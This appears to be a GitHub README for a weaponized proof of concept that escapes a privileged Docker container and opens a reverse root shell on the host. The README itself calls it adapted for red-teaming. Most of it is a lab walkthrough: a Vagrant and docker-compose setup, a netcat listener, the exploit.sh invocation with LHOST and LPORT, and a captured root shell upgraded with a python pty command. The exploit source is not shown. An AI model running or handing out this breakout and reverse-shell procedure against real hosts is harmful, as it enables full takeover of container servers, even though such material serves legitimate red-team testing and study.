# Docker privileged container breakout

## Summary

This Poc a privileged container escape and before root on host server by spawn a reverse tcp shell.
This is just weaponized by Mikael Kall to be used in red-teaming.
Original PoC: https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html


## Demo

![](./demo.gif)

## Usage

To test this PoC we packaged vagrant image that runs docker with the exploit code demostrate the break-out.

First provision and run the vagrant image.

```shell
⬢  docker_escape_privileged  master ⦿ vagrant up --provision
Bringing machine 'default' up with 'virtualbox' provider...
==> default: Importing base box 'debian/stretch64'...
==> default: Matching MAC address for NAT networking...
==> default: Checking if box 'debian/stretch64' version '9.12.0' is up to date...
==> default: Setting the name of the VM: docker_escape_privileged_default_1606209763728_36356
==> default: Clearing any previously set network interfaces...
==> default: Preparing network interfaces based on configuration...
    default: Adapter 1: nat
    default: Adapter 2: hostonly
==> default: Forwarding ports...
    default: 22 (guest) => 2222 (host) (adapter 1)
==> default: Running 'pre-boot' VM customizations...
==> default: Booting VM...
==> default: Waiting for machine to boot. This may take a few minutes...
    default: SSH address: 127.0.0.1:2222
    default: SSH username: vagrant
    default: SSH auth method: private key
    default:
    default: Vagrant insecure key detected. Vagrant will automatically replace
    default: this with a newly generated keypair for better security.
    default:
    default: Inserting generated public key within guest...
    default: Removing insecure key from the guest if it's present...
    default: Key inserted! Disconnecting and reconnecting using new SSH key...
==> default: Machine booted and ready!
==> default: Checking for guest additions in VM...
    default: No guest additions were detected on the base box for this VM! Guest
    default: additions are required for forwarded ports, shared folders, host only
.......

 98 11.1M   98 11.0M    0     0  48814      0  0:04:00  0:03:57  0:00:03 73250
 99 11.1M   99 11.1M    0     0  49068      0  0:03:59  0:03:58  0:00:01 83341
100 11.1M  100 11.1M    0     0  49201      0  0:03:58  0:03:58 --:--:-- 91639

==> default: Machine 'default' has a post `vagrant up` message. This is a message
==> default: from the creator of the Vagrantfile, and not from Vagrant itself:
==> default:
==> default: Vanilla Debian box. See https://app.vagrantup.com/debian for help and bug reports

```

Then `ssh` into machine and start test container.

```shell
⬢  docker_escape_privileged  master ⦿ vagrant ssh
Linux stretch 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

vagrant@stretch:~$ sudo -i
root@stretch:~# cd /vagrant
```

Build container and start container.

```shell
root@stretch:/vagrant# docker-compose build
Building docker_escape
Step 1/8 : FROM alpine:latest
latest: Pulling from library/alpine
188c0c94c7c5: Pull complete
Digest: sha256:c0e9560cda118f9ec63ddefb4a173a2b2a0347082d7dff7dc14272e7841a5b5a
Status: Downloaded newer image for alpine:latest
 ---> d6e46aa2470d
Step 2/8 : RUN apk update
 ---> Running in 733acc97df52
fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/community/x86_64/APKINDEX.tar.gz
v3.12.1-45-gc6d973bfdf [http://dl-cdn.alpinelinux.org/alpine/v3.12/main]
v3.12.1-41-g42f619918d [http://dl-cdn.alpinelinux.org/alpine/v3.12/community]
OK: 12746 distinct packages available
 ---> cbbfdcbb1437
Removing intermediate container 733acc97df52
Step 3/8 : RUN apk add bash
 ---> Running in d8258026410b
(1/4) Installing ncurses-terminfo-base (6.2_p20200523-r0)
(2/4) Installing ncurses-libs (6.2_p20200523-r0)
(3/4) Installing readline (8.0.4-r0)
(4/4) Installing bash (5.0.17-r0)
Executing bash-5.0.17-r0.post-install
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 18 packages
 ---> 0f326de117d9
Removing intermediate container d8258026410b
Step 4/8 : COPY exploit.sh /exploit.sh
 ---> bd5b29ece96f
Removing intermediate container e3e78aaab0a6
Step 5/8 : COPY working.sh /working.sh
 ---> 6b9335b58cca
Removing intermediate container 4ef6bdf250bf
Step 6/8 : RUN chmod +x /exploit.sh
 ---> Running in c38f42b9734f
 ---> 12ff505492ee
Removing intermediate container c38f42b9734f
Step 7/8 : RUN chmod +x /working.sh
 ---> Running in b3315974488e
 ---> dda2d3845f07
Removing intermediate container b3315974488e
Step 8/8 : CMD tail -f /dev/null
 ---> Running in 869c734e0779
 ---> 1484f3121b20
Removing intermediate container 869c734e0779
Successfully built 1484f3121b20

root@stretch:/vagrant# docker-compose up -d
Creating network "vagrant_default" with the default driver
Creating vagrant_docker_escape_1_3d87d5855ae8 ... done
```

Check container is running and exec into it.

```shell
root@stretch:/vagrant# docker ps
CONTAINER ID        IMAGE                   COMMAND               CREATED             STATUS              PORTS               NAMES
f7c3ba529278        vagrant_docker_escape   "tail -f /dev/null"   34 seconds ago      Up 34 seconds                           vagrant_docker_escape_1_6f31b8fa5c64

root@stretch:/vagrant# docker exec -it f7 /bin/bash
bash-5.0# ls
bin         dev         etc         exploit.sh  home        lib         media       mnt         opt         proc        root        run         sbin        srv         sys         tmp         usr         var         working.sh
```

In different terminal ssh into vagrant image and start netcat listener.

```shell
vagrant@stretch:~$ nc -lnvp 4444
listening on [any] 4444 ...
```

Run exploit with LHOST and LPORT point to netcat listner

```shell
bash-5.0# ./exploit.sh
Usage: ./exploit.sh <LHOST> <LPORT>

bash-5.0# ./exploit.sh 192.168.9.9 4444
Pid: 100
Pid: 200
Pid: 300
Pid: 400
Pid: 500

.....

```

And our shell is recieved that broke out from container.

```shell
vagrant@stretch:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.9.9] from (UNKNOWN) [192.168.9.9] 35494
python -c 'import pty;pty.spawn("/bin/bash")'
root@stretch:/# id
uid=0(root) gid=0(root) groups=0(root)
```





